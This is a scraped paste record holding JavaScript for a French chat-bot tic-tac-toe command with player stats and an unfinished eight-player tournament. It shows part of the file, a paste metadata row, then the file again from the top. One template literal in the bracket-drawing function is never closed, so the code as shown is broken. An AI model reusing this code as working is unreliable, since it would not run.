                const currentBracketVisual = await generateTournamentBracketVisual(tournaments[threadID]);
                return api.sendMessage(
                    `✨| 𝚄𝚗 𝚝𝚘𝚞𝚛𝚗𝚘𝚒 𝚎𝚜𝚝 𝚍𝚎́𝚓𝚊̀ 𝚎𝚗 𝚌𝚘𝚞𝚛𝚜 𝚍'𝚒𝚗𝚜𝚌𝚛𝚒𝚙𝚝𝚒𝚘𝚗𝚜 !\n` +
                    `${currentBracketVisual}\n` +
                    `𝚃𝚊𝚙𝚎𝚣 ""𝚓𝚘𝚒𝚗"" 𝚙𝚘𝚞𝚛 𝚛𝚎𝚓𝚘𝚒𝚗𝚍𝚛𝚎 𝚘𝚞 ""𝚘𝚞𝚝"" 𝚙𝚘𝚞𝚛 𝚚𝚞𝚒𝚝𝚝𝚎𝚛.`,
                    threadID,
                    event.messageID
                );
            }

            if (tournaments[threadID] && tournaments[threadID].status === 'in_progress') {
                 return api.sendMessage(""❌| 𝚄𝚗 𝚝𝚘𝚞𝚛𝚗𝚘𝚒 𝚎𝚜𝚝 𝚍𝚎́𝚓𝚊̀ 𝚎𝚗 𝚌𝚘𝚞𝚛𝚜 𝚍𝚊𝚗𝚜 𝚌𝚎 𝚌𝚑𝚊𝚝. 𝚅𝚎𝚞𝚒𝚕𝚕𝚎𝚣 𝚙𝚊𝚝𝚒𝚎𝚗𝚝𝚎𝚛 𝚚𝚞'𝚒𝚕 𝚜𝚎 𝚝𝚎𝚛𝚖𝚒𝚗𝚎."", threadID, event.messageID);
            }
            tournaments[threadID] = {
                players: [],
                status: 'registration',
                bracketStructure: Array(8).fill(null),
                threadID: threadID,
                messageID: null
            };

            const initialBracketVisual = await generateTournamentBracketVisual(tournaments[threadID]);
            const sentMessage = await api.sendMessage(
                `🎉| 𝙻𝚎 𝚝𝚘𝚞𝚛𝚗𝚘𝚒 𝚍𝚎 𝚃𝚒𝚌-𝚃𝚊𝚌-𝚃𝚘𝚎 𝚌𝚘𝚖𝚖𝚎𝚗𝚌𝚎 ! 𝙱𝚎𝚜𝚘𝚒𝚗 𝚍𝚎 𝟾 𝚓𝚘𝚞𝚎𝚞𝚛𝚜.\n` +
                `${initialBracketVisual}\n` +
                `𝚃𝚊𝚙𝚎𝚣 ""𝚓𝚘𝚒𝚗"" 𝚙𝚘𝚞𝚛 𝚛𝚎𝚓𝚘𝚒𝚗𝚍𝚛𝚎 𝚘𝚞 ""𝚘𝚞𝚝"" 𝚙𝚘𝚞𝚛 𝚚𝚞𝚒𝚝𝚝𝚎𝚛.`,
                threadID,
                event.messageID
            );
            tournaments[threadID].messageID = sentMessage.messageID;
            return;
        }
        if (args.length === 0 || command === ""help"") {
            return api.sendMessage(
                `👋| 𝙱𝚒𝚎𝚗𝚟𝚎𝚗𝚞 𝚊𝚞 𝚓𝚎𝚞 𝚍𝚎 𝚃𝚒𝚌-𝚃𝚊𝚌-𝚃𝚘𝚎 !\n` +
                `\n𝙿𝚘𝚞𝚛 𝚌𝚘𝚖𝚖𝚎𝚗𝚌𝚎𝚛 𝚞𝚗𝚎 𝚙𝚊𝚛𝚝𝚒𝚎 :\n` +
                `  •  𝙿𝚘𝚞𝚛 𝚓𝚘𝚞𝚎𝚛 𝚌𝚘𝚗𝚝𝚛𝚎 𝚞𝚗 𝚊𝚖𝚒 : 𝚝𝚊𝚙𝚎𝚣 \`𝚝𝚒𝚌𝚝𝚊𝚌𝚝𝚘𝚎 @𝚗𝚘𝚖_𝚍𝚎_𝚕_𝚊𝚖𝚒\`\n` +
                `  •  𝙾𝚞 𝚎𝚗 𝚞𝚝𝚒𝚕𝚒𝚜𝚊𝚗𝚝 𝚜𝚘𝚗 𝙸𝙳 : 𝚝𝚊𝚙𝚎𝚣 \`𝚝𝚒𝚌𝚝𝚊𝚌𝚝𝚘𝚎 <𝚜𝚘𝚗_𝙸𝙳>\`\n` +
                `\n𝚄𝚗𝚎 𝚏𝚘𝚒𝚜 𝚕𝚊 𝚙𝚊𝚛𝚝𝚒𝚎 𝚕𝚊𝚗𝚌𝚎́𝚎, 𝚙𝚘𝚞𝚛 𝚏𝚊𝚒𝚛𝚎 𝚞𝚗 𝚌𝚘𝚞𝚙 : 𝚎𝚗𝚟𝚘𝚢𝚎𝚣 𝚞𝚗 𝚗𝚞𝚖𝚎́𝚛𝚘 (𝟷-𝟿) 𝚌𝚘𝚛𝚛𝚎𝚜𝚙𝚘𝚗𝚍𝚊𝚗𝚝 à 𝚕𝚊 𝚌𝚊𝚜𝚎 𝚜𝚘𝚞𝚑𝚊𝚒𝚝𝚎́𝚎.\n` +
                `\n𝙿𝚘𝚞𝚛 𝚙𝚕𝚞𝚜 𝚍'𝚊𝚒𝚍𝚎 : \`𝚝𝚒𝚌𝚝𝚊𝚌𝚝𝚘𝚎 𝚑𝚎𝚕𝚙\`\n` +
                `𝙿𝚘𝚞𝚛 𝚟𝚘𝚒𝚛 𝚟𝚘𝚜 𝚜𝚝𝚊𝚝𝚒𝚜𝚝𝚒𝚚𝚞𝚎𝚜 : \`𝚝𝚒𝚌𝚝𝚊𝚌𝚝𝚘𝚎 𝚜𝚝𝚊𝚝𝚜\`\n` +
                `𝙿𝚘𝚞𝚛 𝚊𝚋𝚊𝚗𝚍𝚘𝚗𝚗𝚎𝚛 𝚞𝚗𝚎 𝚙𝚊𝚛𝚝𝚒𝚎 : \`𝚏𝚘𝚛𝚏𝚊𝚒𝚝\`\n` +
                `𝙿𝚘𝚞𝚛 𝚛𝚎𝚕𝚊𝚗𝚌𝚎𝚛 𝚞𝚗𝚎 𝚙𝚊𝚛𝚝𝚒𝚎 𝚝𝚎𝚛𝚖𝚒𝚗𝚎́𝚎 : \`𝚛𝚎𝚜𝚝𝚊𝚛𝚝\`\n` +
                `\n𝙿𝙾𝚄𝚁 𝙻𝙴 𝚃𝙾𝚄𝚁𝙽𝙾𝙸 :\n` +
                `  •  𝙻𝚊𝚗𝚌𝚎𝚛 𝚞𝚗 𝚝𝚘𝚞𝚛𝚗𝚘𝚒 : \`𝚝𝚝𝚝 𝚝𝚘𝚞𝚛𝚗𝚘𝚒\`\n` +
                `  •  𝚁𝚎𝚓𝚘𝚒𝚗𝚍𝚛𝚎 𝚕𝚎 𝚝𝚘𝚞𝚛𝚗𝚘𝚒 : \`𝚓𝚘𝚒𝚗\` (𝚗'𝚒𝚖𝚙𝚘𝚛𝚝𝚎 𝚘𝚞̀ 𝚍𝚊𝚗𝚜 𝚕𝚎 𝚌𝚑𝚊𝚝)\n` +
                `  •  𝚀𝚞𝚒𝚝𝚝𝚎𝚛 𝚕𝚎 𝚝𝚘𝚞𝚛𝚗𝚘𝚒 : \`𝚘𝚞𝚝\` (𝚗'𝚒𝚖𝚙𝚘𝚛𝚝𝚎 𝚘𝚞̀ 𝚍𝚊𝚗𝚜 𝚕𝚎 𝚌𝚑𝚊𝚝)\n` +
                `\n━━━━━━━━❪❐❫━━━━━━━━\n` +
                `𝙰𝚖𝚞𝚜𝚎𝚣-𝚟𝚘𝚞𝚜 𝚋𝚒𝚎𝚗 ! 🎲`,
                threadID,
                event.messageID
            );
        }

        if (command === ""stats"") {
            const stats = playerStats[senderID];
            if (stats) {
                return api.sendMessage(
                    `📊| 𝚅𝚘𝚜 𝚜𝚝𝚊𝚝𝚒𝚜𝚝𝚒𝚚𝚞𝚎𝚜 𝚍𝚎 𝚃𝚒𝚌-𝚃𝚊𝚌-𝚃𝚘𝚎 :\n` +
                    `  •  𝚅𝚒𝚌𝚝𝚘𝚒𝚛𝚎𝚜 : ${stats.wins}\n` +
                    `  •  𝙳𝚎́𝚏𝚊𝚒𝚝𝚎𝚜 : ${stats.losses}\n` +
                    `━━━━━━━━❪❐❫━━━━━━━━`,
                    threadID,
                    event.messageID
                );
            } else {
                return api.sendMessage(
                    `📊| 𝚅𝚘𝚞𝚜 𝚗'𝚊𝚟𝚎𝚣 𝚙𝚊𝚜 𝚎𝚗𝚌𝚘𝚛𝚎 𝚓𝚘𝚞𝚎́ 𝚍𝚎 𝚙𝚊𝚛𝚝𝚒𝚎𝚜 𝚍𝚎 𝚃𝚒𝚌-𝚃𝚊𝚌-𝚃𝚘𝚎. 𝙻𝚊𝚗𝚌𝚎𝚣-𝚟𝚘𝚞𝚜 !`,
                    threadID,
                    event.messageID
                );
            }
        }

        if (mentionedIDs.length > 0) {
            opponentID = mentionedIDs[0];
        } else if (args[0]) {
            if (!/^\d+$/.test(args[0])) {
                return api.sendMessage(""𝙸𝙳 𝚒𝚗𝚟𝚊𝚕𝚒𝚍𝚎. 𝙼𝚎𝚛𝚌𝚒 𝚍𝚎 𝚏𝚘𝚞𝚛𝚗𝚒𝚛 𝚞𝚗 𝙸𝙳 𝚗𝚞𝚖𝚎́𝚛𝚒𝚚𝚞𝚎."", threadID, event.messageID);
            }
            opponentID = args[0];
        }

        if (!opponentID) {
            return api.sendMessage(""❌| 𝙿𝚘𝚞𝚛 𝚌𝚘𝚖𝚖𝚎𝚗𝚌𝚎𝚛 𝚞𝚗𝚎 𝚙𝚊𝚛𝚝𝚒𝚎, 𝚖𝚎𝚗𝚝𝚒𝚘𝚗𝚗𝚎𝚣 𝚞𝚗 𝚊𝚖𝚒 𝚘𝚞 𝚍𝚘𝚗𝚗𝚎𝚣 𝚜𝚘𝚗 𝙸𝙳. 𝙿𝚘𝚞𝚛 𝚍𝚎 𝚕'𝚊𝚒𝚍𝚎, 𝚝𝚊𝚙𝚎𝚣 `𝚝𝚒𝚌𝚝𝚊𝚌𝚝𝚘𝚎 𝚑𝚎𝚕𝚙`."", threadID, event.messageID);
        }
        if (opponentID == senderID) {
            return api.sendMessage(""𝚅𝚘𝚞𝚜 𝚗𝚎 𝚙𝚘𝚞𝚟𝚎𝚣 𝚙𝚊𝚜 𝚓𝚘𝚞𝚎𝚛 𝚌𝚘𝚗𝚝𝚛𝚎 𝚟𝚘𝚞-𝚖𝚎̂𝚖𝚎 !"", threadID, event.messageID);
        }

        const gameID = `${threadID}:${Math.min(senderID, opponentID)}:${Math.max(senderID, opponentID)}`;

        if (games[gameID] && games[gameID].inProgress) {
            return api.sendMessage(""❌| 𝚄𝚗 𝚓𝚎𝚞 𝚎𝚜𝚝 𝚍𝚎́𝚓𝚊̀ 𝚎𝚗 𝚌𝚘𝚞𝚛𝚜 𝚎𝚗𝚝𝚛𝚎 𝚌𝚎𝚜 𝚓𝚘𝚞𝚎𝚞𝚛𝚜. 𝚅𝚎𝚞𝚒𝚕𝚕𝚎𝚣 𝚙𝚊𝚝𝚒𝚎𝚗𝚝𝚎𝚛 ⏳."", threadID, event.messageID);
        }

        const player1Info = await api.getUserInfo(senderID);
        const player2Info = await api.getUserInfo(opponentID);

        if (!player2Info[opponentID]) {
            return api.sendMessage(""𝙸𝚖𝚙𝚘𝚜𝚜𝚒𝚋𝚕𝚎 𝚍𝚎 𝚝𝚛𝚘𝚞𝚟𝚎𝚛 𝚕'𝚞𝚝𝚒𝚕𝚒𝚜𝚊𝚝𝚎𝚞𝚛 𝚊𝚟𝚎𝚌 𝚌𝚎𝚝 𝙸𝙳."", threadID, event.messageID);
        }

        const player1 = { id: senderID, name: player1Info[senderID].name, threadID: threadID };
        const player2 = { id: opponentID, name: player2Info[opponentID].name, threadID: threadID };

        resetGame(gameID, player1, player2);

        api.sendMessage(
            `🎮| 𝙿𝚊𝚛𝚝𝚒𝚎 𝚍𝚎 𝚃𝚒𝚌-𝚃𝚊𝚌-𝚃𝚘𝚎 𝚎𝚗𝚝𝚛𝚎 ${player1.name} 『❌』 𝚎𝚝 ${player2.name} 『⭕』 𝚌𝚘𝚖𝚖𝚎𝚗𝚌𝚎 !\n${displayBoard(games[gameID].board)}\n\n${player1.name}, 𝚏𝚊𝚒𝚝𝚎𝚜 𝚟𝚘𝚝𝚛𝚎 𝚙𝚛𝚎𝚖𝚒𝚎𝚛 𝚖𝚘𝚞𝚟𝚎𝚖𝚎𝚗𝚝 𝚎𝚗 𝚎𝚗𝚟𝚘𝚢𝚊𝚗𝚝 𝚞𝚗 𝚗𝚞𝚖𝚎́𝚛𝚘 (𝟷-𝟿).`,
            threadID,
            event.messageID
        );
    },

    onChat: async function ({ api, event }) {
        const threadID = event.threadID;
        const senderID = event.senderID;
        const messageBody = event.body.trim().toLowerCase();
        const senderInfo = await api.getUserInfo(senderID);
        const senderName = senderInfo[senderID].name;
        const currentTournament = tournaments[threadID];

        if (currentTournament && currentTournament.status === 'registration') {
            if (messageBody === ""join"") {
                const existingPlayer = currentTournament.players.find(p => p.id === senderID);
                if (existingPlayer) {
                    return api.sendMessage(`🧐| ${senderName}, 𝚟𝚘𝚞 𝚎̂𝚝𝚎𝚜 𝚍𝚎́𝚓𝚊̀ 𝚒𝚗𝚜𝚌𝚛𝚒𝚝 𝚊𝚞 𝚝𝚘𝚞𝚛𝚗𝚘𝚒 !`, threadID, event.messageID);
                }
                if (currentTournament.players.length >= 8) {
                    return api.sendMessage(`🚫| 𝙻𝚎 𝚝𝚘𝚞𝚛𝚗𝚘𝚒 𝚎𝚜𝚝 𝚌𝚘𝚖𝚙𝚕𝚎𝚝 (${currentTournament.players.length}/8). 𝚅𝚎𝚞𝚒𝚕𝚕𝚎𝚣 𝚊𝚝𝚝𝚎𝚗𝚍𝚛𝚎 𝚕𝚎 𝚙𝚛𝚘𝚌𝚑𝚊𝚒𝚗 𝚝𝚘𝚞𝚛𝚗𝚘𝚒 !`, threadID, event.messageID);
                }

                currentTournament.players.push({ id: senderID, name: senderName, avatarURL: senderInfo[senderID].profileUrl });
                const updatedBracketVisual = await generateTournamentBracketVisual(currentTournament);

                await api.sendMessage(
                    `✅| ${senderName} 𝚊 𝚛𝚎𝚓o𝚒𝚗𝚝 𝚕𝚎 𝚝𝚘𝚞𝚛𝚗𝚘𝚒 ! ${currentTournament.players.length}/8 𝚓𝚘𝚞𝚎𝚞𝚛𝚜.\n` +
                    `${updatedBracketVisual}\n` +
                    (currentTournament.players.length < 8 ? `𝙴𝚗𝚌𝚘𝚛𝚎 ${8 - currentTournament.players.length} 𝚙𝚕𝚊𝚌𝚎(𝚜) !` : `𝙻𝚎 𝚝𝚘𝚞𝚛𝚗𝚘𝚒 𝚎𝚜𝚝 𝚙𝚛𝚎̂𝚝 !`),
                    threadID,
                    event.messageID
                );
                
                // Si votre API supporte l'édition de messages avec des images,
                // c'est ici que vous tenteriez d'éditer le message initial du bracket
                // au lieu d'en envoyer un nouveau.
                // Exemple (à adapter si votre API a une fonction d'édition de message):
                // if (currentTournament.messageID && yourApi.editMessage) {
                //    const imageBuffer = await generateTournamentBracketImage(currentTournament);
                //    await yourApi.editMessage({ attachment: imageBuffer }, currentTournament.messageID);
                // }


                if (currentTournament.players.length === 8) {
                    currentTournament.status = 'in_progress';

                    await api.sendMessage(
                        `🎉| 𝙻𝚎 𝚝𝚘𝚞𝚛𝚗𝚘𝚒 𝚎𝚜𝚝 𝚌𝚘𝚖𝚙𝚕𝚎𝚝 ! 𝙻𝚎𝚜 𝚖𝚊𝚝𝚌𝚑𝚜 𝚟𝚘𝚗𝚝 𝚌𝚘𝚖𝚖𝚎𝚗𝚌𝚎𝚛 𝚋𝚒𝚎𝚗𝚝𝚘̂𝚝 !`,
                        threadID
                    );
                    // TODO: Ajoutez ici le code pour lancer le premier tour du tournoi.
                    // Par exemple: startTournamentRounds(currentTournament, api, threadID);
                }
                return;
            }

            if (messageBody === ""out"") {
                const playerIndex = currentTournament.players.findIndex(p => p.id === senderID);
                if (playerIndex === -1) {
                    return api.sendMessage(`🧐| ${senderName}, 𝚟𝚘𝚞 𝚗'𝚎̂𝚝𝚎𝚜 𝚙𝚊𝚜 𝚒𝚗𝚜𝚌𝚛𝚒𝚝 𝚊𝚞 𝚝𝚘𝚞𝚛𝚗𝚘𝚒.`, threadID, event.messageID);
                }

                currentTournament.players.splice(playerIndex, 1);
                const updatedBracketVisual = await generateTournamentBracketVisual(currentTournament);
                await api.sendMessage(
                    `🗑️| ${senderName} 𝚊 𝚚𝚞𝚒𝚝𝚝𝚎́ 𝚕𝚎 𝚝𝚘𝚞𝚛𝚗𝚘𝚒. ${currentTournament.players.length}/8 𝚓𝚘𝚞𝚎𝚞𝚛𝚜.\n` +
                    `${updatedBracketVisual}`, // Affiche la mise à jour
                    threadID,
                    event.messageID
                );
                return;
            }
        }

        const gameID = Object.keys(games).find((id) =>
            games[id].threadID === threadID &&
            games[id].players.some(player => player.id === senderID)
        );

        if (!gameID) return;

        const game = games[gameID];
        if (!game.inProgress) {
            if (messageBody === ""restart"") {
                const player1 = game.players[0];
                const player2 = game.players[1];
                resetGame(gameID, player1, player2);
                return api.sendMessage(
                    `🎮| 𝙽𝚘𝚞𝚟𝚎𝚊𝚞 𝚓𝚎𝚞 𝚍𝚎 𝚃𝚒𝚌-𝚃𝚊𝚌-𝚃𝚘𝚎 𝚎𝚗𝚝𝚛𝚎 ${player1.name} 『❌』 𝚎𝚝 ${player2.name} 『⭕』 !\n${displayBoard(game.board)}\n\n${player1.name}, 𝚟𝚘𝚞𝚜 𝚌𝚘𝚖𝚖𝚎𝚗𝚌𝚎𝚣 𝚎𝚗 𝚙𝚛𝚎𝚖𝚒𝚎𝚛, 𝚌𝚑𝚘𝚒𝚜𝚒𝚜𝚜𝚎𝚣 𝚞𝚗𝚎 𝚌𝚊𝚜𝚎.`,
                    threadID,
                    event.messageID
                );
            }
            return;
        }

        if (messageBody === ""forfait"") {
            const forfeitingPlayer = game.players.find(player => player.id === senderID);
            const opponentPlayer = game.players.find(player => player.id !== senderID);

            game.inProgress = false;
            if (!playerStats[forfeitingPlayer.id]) playerStats[forfeitingPlayer.id] = { wins: 0, losses: 0 };
            playerStats[forfeitingPlayer.id].losses++;
            if (!playerStats[opponentPlayer.id]) playerStats[opponentPlayer.id] = { wins: 0, losses: 0 };
            playerStats[opponentPlayer.id].wins++;

            return api.sendMessage(
                `🏳️| ${forfeitingPlayer.name} 𝚊 𝚊𝚋𝚊𝚗𝚍𝚘𝚗𝚗𝚎́ 𝚕𝚊 𝚙𝚊𝚛𝚝𝚒𝚎. ${opponentPlayer.name} 𝚎𝚜𝚝 𝚍𝚎́𝚌𝚕𝚊𝚛𝚎́ 𝚟𝚊𝚒𝚗𝚚𝚞𝚎𝚞𝚛 ! 𝚃𝚊𝚙𝚎𝚣 ""𝚛𝚎𝚜𝚝𝚊𝚛𝚝"" 𝚙𝚘𝚞𝚛 𝚛𝚎𝚌𝚘𝚖𝚖𝚎𝚗𝚌𝚎𝚛.`,
                threadID,
                event.messageID
            );
        }

        const position = parseInt(messageBody) - 1;
        const currentPlayer = game.players[game.currentPlayerIndex];

        if (senderID !== currentPlayer.id) {
            if (isNaN(position) || position < 0 || position > 8 || game.board[position] !== null) {
                return;
            }
            return api.sendMessage(`𝙲𝚎 𝚗'𝚎𝚜𝚝 𝚙𝚊𝚜 𝚟𝚘𝚝𝚛𝚎 𝚝𝚘𝚞𝚛 ${game.players.find(p => p.id === senderID).name} ! 𝙲'𝚎𝚜𝚝 𝚕𝚎 𝚝𝚘𝚞𝚛 𝚍𝚎 ${currentPlayer.name}.`, threadID, event.messageID);
        }

        if (isNaN(position) || position < 0 || position > 8 || game.board[position] !== null) {
            return api.sendMessage(`${currentPlayer.name}, 𝚌𝚊𝚜𝚎 𝚒𝚗𝚟𝚊𝚕𝚒𝚍𝚎 𝚘𝚞 𝚍𝚎́𝚓𝚊̀ 𝚘𝚌𝚌𝚞𝚙𝚎́𝚎. 𝙲'𝚎𝚜𝚝 𝚝𝚘𝚞𝚓𝚘𝚞𝚛𝚜 à 𝚟𝚘𝚝𝚛𝚎 𝚝𝚘𝚞𝚛 !`, threadID, event.messageID);
        }

        game.board[position] = currentPlayer.symbol;

        if (checkWinner(game.board) || isBoardFull(game.board)) {
            await handleGameEnd(gameID, api, event);
            return;
        }

        game.currentPlayerIndex = (game.currentPlayerIndex + 1) % 2;
        const nextPlayer = game.players[game.currentPlayerIndex];
        api.sendMessage(
            `${displayBoard(game.board)}\n\n${nextPlayer.name}, 𝚌'𝚎𝚜𝚝 à 𝚟𝚘𝚝𝚛𝚎 𝚝𝚘𝚞𝚛 !`,
            threadID,
            event.messageID
        );
    }
};"
FXgf0Sk6,Untitled,Shisui_Daniel,JSON,Saturday 26th of July 2025 01:59:41 AM CDT,"let games = {};
let tournaments = {};

const playerStats = {}; 
function checkWinner(board) {
    const winPatterns = [
        [0, 1, 2], [3, 4, 5], [6, 7, 8],
        [0, 3, 6], [1, 4, 7], [2, 5, 8],
        [0, 4, 8], [2, 4, 6]
    ];
    for (const pattern of winPatterns) {
        const [a, b, c] = pattern;
        if (board[a] && board[a] === board[b] && board[a] === board[c]) {
            return board[a];
        }
    }
    return null;
}

function isBoardFull(board) {
    return board.every((cell) => cell !== null);
}

function displayBoard(board) {
    let display = """";
    for (let i = 0; i < 9; i++) {
        display += board[i] ? board[i] : ""🟨"";
        display += (i + 1) % 3 === 0 ? ""\n"" : "" "";
    }
    return display;
}

function resetGame(gameID, player1, player2) {
    games[gameID] = {
        board: Array(9).fill(null),
        players: [
            { id: player1.id, name: player1.name, symbol: ""❌"" },
            { id: player2.id, name: player2.name, symbol: ""⭕"" }
        ],
        currentPlayerIndex: 0,
        inProgress: true,
        restartPrompted: false,
        threadID: player1.threadID
    };
}

async function handleGameEnd(gameID, api, event) {
    const game = games[gameID];
    const winner = checkWinner(game.board);
    const boardMessage = displayBoard(game.board);

    if (winner) {
        const winnerPlayer = game.players.find(player => player.symbol === winner);
        const loserPlayer = game.players.find(player => player.symbol !== winner);

        if (!playerStats[winnerPlayer.id]) playerStats[winnerPlayer.id] = { wins: 0, losses: 0 };
        playerStats[winnerPlayer.id].wins++;
        if (!playerStats[loserPlayer.id]) playerStats[loserPlayer.id] = { wins: 0, losses: 0 };
        playerStats[loserPlayer.id].losses++;

        await api.sendMessage(`${boardMessage}\n🎉| ${winnerPlayer.name} 𝚊 𝚐𝚊𝚐𝚗𝚎́ ! 𝚃𝚊𝚙𝚎𝚣 ""𝚛𝚎𝚜𝚝𝚊𝚛𝚝"" 𝚙𝚘𝚞𝚛 𝚛𝚎𝚌𝚘𝚖𝚖𝚎𝚗𝚌𝚎𝚛.`, event.threadID);
        game.inProgress = false;
    } else if (isBoardFull(game.board)) {
        game.players.forEach(player => {
            if (!playerStats[player.id]) playerStats[player.id] = { wins: 0, losses: 0 };
        });
        await api.sendMessage(`${boardMessage}\n🤝| 𝙼𝚊𝚝𝚌𝚑 𝚗𝚞𝚕 ! 𝚃𝚊𝚙𝚎𝚣 '𝚛𝚎𝚜𝚝𝚊𝚛𝚝' 𝚙𝚘𝚞𝚛 𝚛𝚎𝚌𝚘𝚖𝚖𝚎𝚗𝚌𝚎𝚛.`, event.threadID);
        game.inProgress = false;
    }
    game.restartPrompted = true;
}
async function generateTournamentBracketVisual(tournament) {
    let bracket = `╔═══════════════════════════════════╗\n`;
    bracket += `║                    🏆 𝚃𝙾𝚄𝚁𝙽𝙾𝙸 𝙳𝙴 𝚃𝙸𝙲-𝚃𝙰𝙲-𝚃𝙾𝙴 🏆                   ║\n`;
    bracket += `╠═══════════════════════════════════╣\n`;
    bracket += `║                                                              ║\n`;
    bracket += `║  𝚂𝚝𝚊𝚝𝚞𝚝 : ${tournament.status === 'registration' ? '𝙸𝚗𝚜𝚌𝚛𝚒𝚙𝚝𝚒𝚘𝚗𝚜 𝚘𝚞𝚟𝚎𝚛𝚝𝚎𝚜' : '𝙴𝚗 𝚌𝚘𝚞𝚛𝚜'}\n`;
    bracket += `║  𝙹𝚘𝚞𝚎𝚞𝚛𝚜 𝚒𝚗𝚜𝚌𝚛𝚒𝚝𝚜 : ${tournament.players.length}/8\n`;
    bracket += `║                                                              ║\n`;
    bracket += `╠════════════════════════════════════╣\n`;
    bracket += `║                     𝙿𝙰𝚁𝚃𝙸𝙲𝙸𝙿𝙰𝙽𝚃𝚂                           ║\n`;
    bracket += `╠════════════════════════════════════╣\n

    if (tournament.players.length === 0) {
        bracket += `║ 𝙰𝚞𝚌𝚞𝚗 𝚓𝚘𝚞𝚎𝚞𝚛 𝚒𝚗𝚜𝚌𝚛𝚒𝚝 𝚙𝚘𝚞𝚛 𝚕'𝚒𝚗𝚜𝚝𝚊𝚗𝚝.                     ║\n`;
    } else {
        tournament.players.forEach((player, index) => {
            bracket += `║ ${index + 1}. ${player.name}\n`;
        });
    }

    bracket += `╚═══════════════════════════════════╝\n`;
    bracket += `    ${tournament.players[0]?.name || '➖'} vs ${tournament.players[1]?.name || '➖'}\n`;
    bracket += `    ${tournament.players[2]?.name || '➖'} vs ${tournament.players[3]?.name || '➖'}\n`;
    bracket += `    ${tournament.players[4]?.name || '➖'} vs ${tournament.players[5]?.name || '➖'}\n`;
    bracket += `    ${tournament.players[6]?.name || '➖'} vs ${tournament.players[7]?.name || '➖'}\n`;

    return bracket;
}


module.exports = {
    config: {
        name: ""tictactoe"",
        aliases: [""ttt""],
        version: ""1.4"",
        author: ""ミ★𝐒𝐎𝐍𝐈𝐂✄𝐄𝚇𝙴 3.0★彡"",
        category: ""game"",
        shortDescription: ""Un jeu de morpion à deux joueurs ou un tournoi à 8 joueurs."",
        usage: ""tictactoe | tictactoe @ami | tictactoe <ID> | tictactoe help | tictactoe stats | ttt tournoi | join | out""
    },

    onStart: async function ({ api, event, args }) {
        const threadID = event.threadID;
        const senderID = event.senderID;
        let opponentID = null;

        if (!playerStats[senderID]) {
            playerStats[senderID] = { wins: 0, losses: 0 };
        }

        const mentionedIDs = Object.keys(event.mentions);
        const command = args[0]?.toLowerCase();
        if (command === ""tournoi"") {
            if (tournaments[threadID] && tournaments[threadID].status === 'registration') {
                const currentBracketVisual = await generateTournamentBracketVisual(tournaments[threadID]);
                return api.sendMessage(
                    `✨| 𝚄𝚗 𝚝𝚘𝚞𝚛𝚗𝚘𝚒 𝚎𝚜𝚝 𝚍𝚎́𝚓𝚊̀ 𝚎𝚗 𝚌𝚘𝚞𝚛𝚜 𝚍'𝚒𝚗𝚜𝚌𝚛𝚒𝚙𝚝𝚒𝚘𝚗𝚜 !\n` +
                    `${currentBracketVisual}\n` +
                    `𝚃𝚊𝚙𝚎𝚣 ""𝚓𝚘𝚒𝚗"" 𝚙𝚘𝚞𝚛 𝚛𝚎𝚓𝚘𝚒𝚗𝚍𝚛𝚎 𝚘𝚞 ""𝚘𝚞𝚝"" 𝚙𝚘𝚞𝚛 𝚚𝚞𝚒𝚝𝚝𝚎𝚛.`,
                    threadID,
                    event.messageID
                );
            }

            if (tournaments[threadID] && tournaments[threadID].status === 'in_progress') {
                 return api.sendMessage(""❌| 𝚄𝚗 𝚝𝚘𝚞𝚛𝚗𝚘𝚒 𝚎𝚜𝚝 𝚍𝚎́𝚓𝚊̀ 𝚎𝚗 𝚌𝚘𝚞𝚛𝚜 𝚍𝚊𝚗𝚜 𝚌𝚎 𝚌𝚑𝚊𝚝. 𝚅𝚎𝚞𝚒𝚕𝚕𝚎𝚣 𝚙𝚊𝚝𝚒𝚎𝚗𝚝𝚎𝚛 𝚚𝚞'𝚒𝚕 𝚜𝚎 𝚝𝚎𝚛𝚖𝚒𝚗𝚎."", threadID, event.messageID);
            }
            tournaments[threadID] = {
                players: [],
                status: 'registration',
                bracketStructure: Array(8).fill(null),
                threadID: threadID,
                messageID: null
            };

            const initialBracketVisual = await generateTournamentBracketVisual(tournaments[threadID]);
            const sentMessage = await api.sendMessage(
                `🎉| 𝙻𝚎 𝚝𝚘𝚞𝚛𝚗𝚘𝚒 𝚍𝚎 𝚃𝚒𝚌-𝚃𝚊𝚌-𝚃𝚘𝚎 𝚌𝚘𝚖𝚖𝚎𝚗𝚌𝚎 ! 𝙱𝚎𝚜𝚘𝚒𝚗 𝚍𝚎 𝟾 𝚓𝚘𝚞𝚎𝚞𝚛𝚜.\n` +
                `${initialBracketVisual}\n` +
                `𝚃𝚊𝚙𝚎𝚣 ""𝚓𝚘𝚒𝚗"" 𝚙𝚘𝚞𝚛 𝚛𝚎𝚓𝚘𝚒𝚗𝚍𝚛𝚎 𝚘𝚞 ""𝚘𝚞𝚝"" 𝚙𝚘𝚞𝚛 𝚚𝚞𝚒𝚝𝚝𝚎𝚛.`,
                threadID,
                event.messageID
            );
            tournaments[threadID].messageID = sentMessage.messageID;
            return;
        }
        if (args.length === 0 || command === ""help"") {
            return api.sendMessage(
                `👋| 𝙱𝚒𝚎𝚗𝚟𝚎𝚗𝚞 𝚊𝚞 𝚓𝚎𝚞 𝚍𝚎 𝚃𝚒𝚌-𝚃𝚊𝚌-𝚃𝚘𝚎 !\n` +
                `\n𝙿𝚘𝚞𝚛 𝚌𝚘𝚖𝚖𝚎𝚗𝚌𝚎𝚛 𝚞𝚗𝚎 𝚙𝚊𝚛𝚝𝚒𝚎 :\n` +
                `  •  𝙿𝚘𝚞𝚛 𝚓𝚘𝚞𝚎𝚛 𝚌𝚘𝚗𝚝𝚛𝚎 𝚞𝚗 𝚊𝚖𝚒 : 𝚝𝚊𝚙𝚎𝚣 \`𝚝𝚒𝚌𝚝𝚊𝚌𝚝𝚘𝚎 @𝚗𝚘𝚖_𝚍𝚎_𝚕_𝚊𝚖𝚒\`\n` +
                `  •  𝙾𝚞 𝚎𝚗 𝚞𝚝𝚒𝚕𝚒𝚜𝚊𝚗𝚝 𝚜𝚘𝚗 𝙸𝙳 : 𝚝𝚊𝚙𝚎𝚣 \`𝚝𝚒𝚌𝚝𝚊𝚌𝚝𝚘𝚎 <𝚜𝚘𝚗_𝙸𝙳>\`\n` +
